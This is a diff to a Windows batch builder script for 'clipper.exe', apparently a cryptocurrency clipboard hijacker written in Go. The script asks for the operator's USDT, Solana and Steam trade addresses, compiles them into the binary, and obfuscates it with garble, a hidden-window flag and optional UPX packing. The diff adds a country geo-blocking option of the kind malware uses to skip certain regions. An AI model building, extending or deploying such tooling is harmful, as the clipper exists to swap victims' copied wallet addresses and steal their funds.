@@ -1,10 +1,8 @@
 @echo off
-
 chcp 65001 >nul
 setlocal enabledelayedexpansion
 
 cls
-
 
 echo.
 echo    _ __ _   _ _ __   __ _
@@ -38,6 +36,13 @@ echo.
 
 set /p "STEAM=Steam trade url: "
 
+echo.
+
+echo Enter country codes to block (ISO 3166-1 alpha-2)
+echo Example: RU,KZ,BY,UA,MD
+echo Press Enter to skip
+set /p "GEO_BLOCK=Geo block: "
+
 cls
 
 echo.
@@ -58,20 +63,38 @@ set "LDFLAGS=%LDFLAGS% -X main.UsdtTrcAddr=%USDT%"
 set "LDFLAGS=%LDFLAGS% -X main.SolAddr=%SOL%"
 set "LDFLAGS=%LDFLAGS% -X main.SteamAddr=%STEAM%"
 
-garble -seed=random -tiny build -ldflags="-H=windowsgui %LDFLAGS%" -o clipper.exe 
+if defined GEO_BLOCK (
+    set "GEO_BLOCK_CLEAN=!GEO_BLOCK!"
+    set "GEO_BLOCK_CLEAN=!GEO_BLOCK_CLEAN:"=!"
+    set "GEO_BLOCK_CLEAN=!GEO_BLOCK_CLEAN: =!"
+    
+    if not "!GEO_BLOCK_CLEAN!"=="" (
+        set "LDFLAGS=!LDFLAGS! -X main.blockedGeos=!GEO_BLOCK_CLEAN!"
+    )
+)
+
+garble -seed=random -tiny build -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
 if errorlevel 1 (
     echo Build failed
     pause
     exit /b 1
 )
 
+cls
+
 echo.
+echo    _ __ _   _ _ __   __ _
+echo   ^| '__^| ^| ^| ^| '_ \ / _` ^|
+echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
+echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| build completed
+echo.
+
 echo Build successful! File: .\clipper.exe
 
 echo.
 set /p "USE_UPX=Use UPX? (y/n): "
 
-if /i "%USE_UPX%"=="y" (
+if /i "!USE_UPX!"=="y" (
     echo.
     
     if exist ".\upx.exe" (
